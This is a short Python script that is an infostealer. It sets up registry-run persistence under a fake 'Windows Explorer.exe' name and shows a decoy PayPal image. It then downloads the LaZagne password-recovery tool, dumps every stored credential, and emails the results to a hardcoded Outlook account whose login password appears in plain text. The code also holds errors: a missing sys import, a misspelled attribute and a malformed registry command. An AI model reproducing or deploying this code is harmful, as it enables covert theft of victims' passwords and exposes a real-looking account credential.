import requests
import subprocess
import smtplib
import os
import tempfile
import shutil

def become_persistent():
    Malocation = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(Malocation):
        shutil.copyfile(sys.exexutable, Malocation)
        subprocess.call("reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v Explorer /t REG_SZ /d Exexutables/Download.exe" + Malocation, shell=True)

file_name = sys._MEIPASS + "\paypalSS.png"
subprocess.Popen(file_name, shell=True)

def Download(url):
    GetResponse = requests.get(url)
    filename = url.split("/") [-1]

    with open(filename, "wb") as out_file:
        out_file.write(GetResponse.content)

    print(GetResponse)

def SendMail(email, password, message):

    server = smtplib.SMTP("smtp.office365.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

result = subprocess.check_output("lazagne.exe all", shell=True);
print(result)

SendMail("favinaj@outlook.com", "06191999Aa!", result)
os.remove("lazagne.exe")
